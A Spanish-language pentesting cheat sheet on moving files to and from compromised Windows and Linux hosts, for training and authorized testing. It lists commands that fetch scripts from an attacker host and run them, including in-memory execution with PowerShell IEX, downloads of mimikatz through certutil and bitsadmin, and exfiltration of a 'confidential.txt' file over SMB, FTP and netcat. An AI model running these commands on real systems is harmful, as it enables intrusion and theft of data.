
# File Transfers

{% hint style="danger" %}
**Nota:** Este tipo de técnicas son muy invasivas, ya que vamos a enviar y recibir archivos en sistemas comprometidos, por lo que no podemos utilizar estas técnicas sin un consentimiento o aprobación por parte del objetivo
{% endhint %}

## <mark style="color:purple;">En la máquina que envía el archivo</mark>

```bash
cd {Carpeta del archivo a enviar}
python2 -m SimpleHTTPServer
python3 -m http.server
```

Si no le especificamos un puerto, por defecto usará el 8000. Si le especificamos el puerto 80 nos ahorraríamos poner el puerto en el comando de descarga.

```bash
python3 -m http.server 80
```

## <mark style="color:purple;">En la máquina que recibe el archivo</mark>

### Descarga con Wget o Curl

```bash
wget http://{IP-ORIGEN}:{PUERTO}/mimikatz.exe

# Ejemplo
wget http://10.10.10.10:8000/mimikatz.exe
curl http://10.10.10.10:8000/mimikatz.exe -o mimikatz.exe
```

{% hint style="success" %}
Si especificamos el puerto 80 en el envío con python solamente tendríamos que introducir la IP de la máquina que envía el archivo y el archivo a enviar
{% endhint %}

```bash
python3 -m http.server 80
wget http://10.10.10.10/mimikatz.exe
```

### Ejecutar archivos directamente en Linux

Ejemplo con un ejecutable en Bash

```bash
wget http://10.10.10.10/linpeas.sh | sh
```

### Descarga con PowerShell

Podemos especificar el nombre de la clase `Net.WebClient` y el método `DownloadFile` con los parámetros correspondientes a la URL del archivo de destino para descargar y el nombre del archivo de salida.

```powershell
(New-Object Net.WebClient).DownloadFile('http://10.10.10.10/mimikatz.exe','mimikatz.exe')
```

```powershell
(New-Object Net.WebClient).DownloadFileAsync('http://10.10.10.10/mimikatz.exe','mimikatz.exe')
```

### Descarga con certutil.exe en Windows

Desde un CMD en Windows nos podemos descargar el archivo que estamos sirviendo desde un servidor local en python:

```bash
certutil.exe -f -urlcache -split http://10.10.10.10/PowerView.ps1
```

### Descarga con PowerShell - Método Fileless

Los ataques sin archivos funcionan mediante el uso de algunas funciones del sistema operativo para descargar y ejecutar los payloads. PowerShell también se puede utilizar para realizar ataques sin archivos. **En lugar de descargar** un script de PowerShell en el disco, podemos **ejecutarlo** directamente en la memoria usando el comando `Invoke-Expression` o el alias `IEX`

```powershell
IEX (New-Object Net.WebClient).DownloadString('http://10.10.10.10/mimikatz.exe')
```

```powershell
(New-Object Net.WebClient).DownloadString('http://10.10.10.10/mimikatz.exe') | IEX
```

### **PowerShell Invoke-WebRequest**

Desde PowerShell 3.0 en adelante, el cmdlet `Invoke-WebRequest` también está disponible, pero es notablemente más lento para descargar archivos. Puedes usar los alias `iwr`, `curl` y `wget` en lugar del nombre completo `Invoke-WebRequest`.

```powershell
Invoke-WebRequest -Uri 'http://10.10.10.10/mimikatz.exe' -OutFile 'mimikatz.exe'
```

```powershell
iwr -Uri 'http://10.10.10.10/mimikatz.exe' -OutFile 'mimikatz.exe'
```

### Descarga con SMB

El protocolo SMB que se ejecuta en el puerto TCP/445 se encuentra más comúnmente en las redes empresariales donde se ejecutan los servicios de Windows. Permite que las aplicaciones y los usuarios transfieran archivos entre servidores remotos. Podemos usar SMB para descargar archivos de nuestra máquina atacante fácilmente. Necesitamos crear un servidor SMB en nuestra máquina con smbserver.py de Impacket y luego usar copiar, mover, PowerShell Copy-Item o cualquier otra herramienta que permita la conexión a SMB.

```bash
sudo impacket-smbserver share -smb2support /tmp/smb_share
```

```
copy \\10.10.10.10\mimikatz.exe
```

{% hint style="warning" %}
¡Las nuevas versiones de Windows bloquean el acceso de usuarios no autenticados! Para transferir archivos en este escenario, podemos establecer un nombre de usuario y una contraseña usando nuestro servidor SMB de Impacket y montar el servidor SMB en nuestra máquina de destino de Windows:
{% endhint %}

```bash
sudo impacket-smbserver share -smb2support /tmp/smbshare -user johnDoe -password Sup3rP@ssw0rd!
```

```
net use z: \\10.10.10.10\share /user:johnDoe Sup3rP@ssw0rd!
```

#### Desde la interfaz gráfica de Windows

<figure><img src="/files/nwQ5plDdB8Rm2Assfavh" alt=""><figcaption></figcaption></figure>

### Descarga con FTP

Otra forma de transferir archivos es mediante FTP (Protocolo de transferencia de archivos), que utilizan los puertos TCP/21 y TCP/20. Podemos usar el cliente FTP o PowerShell Net.WebClient para descargar archivos desde un servidor FTP. Podemos configurar un servidor FTP en nuestro host de ataque usando el módulo Python3 pyftpdlib. Se puede instalar con el siguiente comando:

```bash
sudo pip3 install pyftpdlib
```

{% hint style="warning" %}
Por defecto, pyftpdlib usa el puerto 2121. Podemos cambiarlo con la opción `-p / --port`
{% endhint %}

```bash
sudo python3 -m pyftpdlib --port 21
```

#### Descargar archivos desde un servidor FTP con PowerShell

```powershell
(New-Object System.Net.WebClient).DownloadFile('ftp://10.10.10.10/mimikatz.exe','mimikatz.exe')
```

```bash
echo open 10.10.10.10 8000 > ftp.txt
echo USER anonymous >> ftp.txt
echo GET mimikatz.exe >> ftp.txt
echo BYE >> ftp.txt
ftp -v -s:ftp.txt
```

### Carga de archivos - FTP

La carga de archivos mediante FTP es muy similar a la descarga de archivos. Podemos usar PowerShell o el cliente FTP para completar la operación. Antes de iniciar nuestro servidor FTP utilizando el módulo de Python pyftpdlib, debemos especificar la opción --write para permitir que los clientes carguen archivos en nuestro host de ataque.

```bash
sudo python3 -m pyftpdlib --port 21 --write
```

**PowerShell Upload File**

```powershell
(New-Object System.Net.WebClient).UploadFile('ftp://192.168.35.12/mimikatz.exe','C:\Users\Public\mimikatz.exe')
```

```bash
echo open 192.168.35.12 8000 > ftp.txt
echo USER anonymous >> ftp.txt
echo binary >> ftp.txt
echo PUT mimikatz.exe >> ftp.txt
echo BYE >> ftp.txt
ftp -v -s:ftp.txt
```

## <mark style="color:purple;">**Envío de archivos con Impacket smbserver**</mark>

Esta técnica sirve para transferir archivos desde un host Windows a nuestra máquina de atacante. Vamos a crear un recurso compartido con `impacket-smbserver` en Kali Linux:

{% code overflow="wrap" %}

```shell-session
afsh4ck@kali$ sudo impacket-smbserver -smb2support CompData /home/kali/Descargas/

Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```

{% endcode %}

Una vez creado podemos enviarnos archivos desde la máquina Windows con el siguiente comando:

<pre class="language-powershell"><code class="lang-powershell"><strong>C:\> move confidential.txt \\10.10.15.16\CompData
</strong>        1 file(s) moved.
</code></pre>

## <mark style="color:purple;">Con Netcat</mark>

Comando para <mark style="color:purple;">recibir</mark> el fichero en Linux y Windows:

```bash
nc -lvp 4444 > FiletoTransfer
```

Comando para <mark style="color:purple;">enviar</mark> el fichero en Linux y Windows:

```bash
nc IP-DESTINO 4444 < FiletoTransfer
```

## <mark style="color:purple;">Usando Base64</mark>

En algunos casos, es posible que no podamos transferir el archivo. Por ejemplo, el host remoto puede tener protecciones de firewall que nos impiden descargar un archivo de nuestra máquina. En este tipo de situación, podemos usar un truco simple para codificar en base64 el archivo en formato `base64`, y luego podemos pegar la `base64`cadena en el servidor remoto y decodificarla. Por ejemplo, si quisiéramos transferir un archivo binario llamado `shell`, podemos `base64`codificarlo de la siguiente manera:

```shell-session
afshack@kali$ base64 shell -w 0

f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAA... <SNIP> ...lIuy9iaW4vc2gAU0iJ51JXSInmDwU
```

Ahora, podemos copiar esta cadena en `base64`, ir al host remoto,  y usar `base64 -d` para decodificarla y canalizar la salida a un archivo:

{% code overflow="wrap" %}

```shell-session
user@remotehost$ echo f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAA... <SNIP> ...lIuy9iaW4vc2gAU0iJ51JXSInmDwU | base64 -d > shell
```

{% endcode %}

## <mark style="color:purple;">Guía rápida</mark>

| **Comando**                                                                                                        | **Descripción**                                  |
| ------------------------------------------------------------------------------------------------------------------ | ------------------------------------------------ |
| `Invoke-WebRequest https://IP:PUERTO/PowerView.ps1 -OutFile PowerView.ps1`                                         | Descargar un archivo con PowerShell              |
| `IEX (New-Object Net.WebClient).DownloadString('https://IP:PUERTO/Mimikatz.ps1')`                                  | Ejecutar un archivo en memoria usando PowerShell |
| `Invoke-WebRequest -Uri http://IP:PUERTO -Method POST -Body $b64`                                                  | Subir un archivo con PowerShell                  |
| `bitsadmin /transfer n http://IP:PUERTO/nc.exe C:\Temp\nc.exe`                                                     | Descargar un archivo usando Bitsadmin            |
| `certutil.exe -verifyctl -split -f http://IP:PUERTO/nc.exe`                                                        | Descargar un archivo usando Certutil             |
| `wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh`                   | Descargar un archivo usando Wget                 |
| `curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh`                   | Descargar un archivo usando curl                 |
| `php -r '$file = file_get_contents("https://IP:PUERTO/LinEnum.sh"); file_put_contents("LinEnum.sh",$file);'`       | Descargar un archivo usando PHP                  |
| `scp C:\Temp\bloodhound.zip user@IP:/tmp/bloodhound.zip`                                                           | Subir un archivo usando SCP                      |
| `scp user@target:/tmp/mimikatz.exe C:\Temp\mimikatz.exe`                                                           | Descargar un archivo usando SCP                  |
| `Invoke-WebRequest http://nc.exe -UserAgent [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome -OutFile "nc.exe"` | Invoke-WebRequest usando Chrome User Agent       |

## <mark style="color:purple;">Hack Tools Plugin</mark>

<figure><img src="/files/TSWWHklfvLtmvYntyAyI" alt=""><figcaption><p>Hack Tools PLugin</p></figcaption></figure>

{% embed url="<https://chrome.google.com/webstore/detail/hack-tools/cmbndhnoonmghfofefkcccljbkdpamhi?hl=es-419>" %}

Este plugin disponible para todos los navegadores tenemos recogidas todas estas técnicas de envío de archivos, pudiendo configurar la IP, el puerto y el nombre del archivo que queremos enviar.
